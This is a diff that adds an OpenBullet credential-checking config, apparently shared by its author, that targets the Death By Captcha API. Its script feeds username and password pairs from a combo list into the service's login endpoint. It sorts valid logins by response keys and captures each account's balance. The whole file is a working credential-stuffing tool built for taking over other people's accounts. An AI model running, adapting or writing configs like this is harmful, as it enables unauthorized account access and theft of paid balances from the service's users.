@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "DBC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-09T00:14:02.6766397+05:00",
+  "AdditionalInfo": "",
+  "Author": "Ruvaid#3131",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RegexMatch "([^@]+)" "<USER>" -> VAR "U" 
+
+FUNCTION Constant "<PASS>" -> VAR "UGH" 
+
+REQUEST POST "http://api.dbcapi.me/api/user" 
+  CONTENT "username=<U>&password=<UGH>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: api.dbcapi.me" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Length: 28" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "balance" 
+    KEY ", \"status\": " 
+  KEYCHAIN Failure OR 
+    KEY "\"error\": \"not-logged-in\"}" 
+    KEY "{\"status\": 255" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "Cap1" 
+
+FUNCTION Replace "\"" "" "<Cap1>" -> VAR "Cap2" 
+
+FUNCTION Replace ":" " " "<Cap2>" -> CAP "Capture" 
+
